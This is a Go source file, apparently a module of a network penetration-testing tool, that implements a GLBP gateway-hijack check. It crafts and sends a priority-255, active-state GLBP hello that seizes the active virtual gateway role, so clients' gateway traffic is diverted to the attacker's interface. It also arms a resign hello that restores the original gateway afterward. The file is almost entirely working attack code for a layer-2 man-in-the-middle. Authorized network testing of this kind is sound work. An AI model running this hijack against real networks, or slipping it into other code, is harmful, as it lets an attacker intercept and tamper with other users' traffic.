// glbp.go implements the GLBP virtual-router hijack check. Impact
// temporary, restore active, affects clients: the hello with priority 255
// and the active state claims the active virtual gateway role for the
// group, so the clients' gateway traffic goes to the attack leg, and the
// armed resign hello (lowered priority, listen state) hands the role back
// when the run ends. The group takes the full two octets its frame field
// holds, since no vendored source states a narrower range.
//
// The baseline (l2l3-audit) does not carry a GLBP attack. The craft is
// authored from Wireshark's packet-glbp.c at commit
// 1dbb8baf9c5bb2e9501b15cce98cea6a3c0f41a3, lines 137-218 and 289-365.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type glbpFinding struct {
	Action   string `json:"action"`
	Group    uint16 `json:"group"`
	Priority uint8  `json:"priority"`
	State    string `json:"state"`
	Restore  string `json:"restore"`
}

// RunGLBP arms a resign teardown before sending a high-priority hello for
// the target's group and virtual IP from the attack leg's own addresses.
// The priorities are probe content. The verdict is pending: whether the
// gateway yielded the AVG role needs a hello listener it does not have.
func RunGLBP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldGroup, check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	group := *deps.Target.Group
	priority := uint8(255)
	vip := deps.Target.VirtualIP

	// Arm the resign teardown before the first frame.
	resignPkt, err := craftGLBPHello(addr, group, 100, nl.GLBPStateListen, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "glbp: craft resign")
	}
	deps.Teardown.Arm("glbp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// Send the hello to claim the active role.
	helloPkt, err := craftGLBPHello(addr, group, priority, nl.GLBPStateActive, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "glbp: craft hello")
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "glbp: send hello")
	}

	detail, _ := json.Marshal(glbpFinding{
		Action:   "glbp-hijack",
		Group:    group,
		Priority: priority,
		State:    "active",
		Restore:  "glbp-resign",
	})
	deps.Emitter.Finding("glbp", detail)

	return check.Pending("no observable: AVG takeover needs a hello listener"), nil
}

// craftGLBPHello builds a GLBP hello: Ethernet → IPv4 → UDP(3222) → GLBP.
func craftGLBPHello(addr link.Addr, group uint16, priority uint8, state nl.GLBPState, vip net.IP) ([]byte, error) {
	src := addr.MAC
	eth := &layers.Ethernet{
		DstMAC:       glbpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    addr.IPv4,
		DstIP:    net.IPv4(224, 0, 0, 102),
	}
	udp := &layers.UDP{
		SrcPort: 3222,
		DstPort: 3222,
	}
	glbp := &nl.GLBP{
		Version:  1,
		Group:    group,
		OwnerMAC: src,
		TLVs: []nl.GLBPTLV{
			{
				Type: 1,
				Hello: &nl.GLBPHello{
					State:          state,
					Priority:       priority,
					HelloTime:      3000,
					HoldTime:       10000,
					AddressType:    1,
					AddressLength:  4,
					VirtualAddress: vip.To4(),
				},
			},
		},
	}
	return craftUDPLayer(eth, ip, udp, glbp)
}
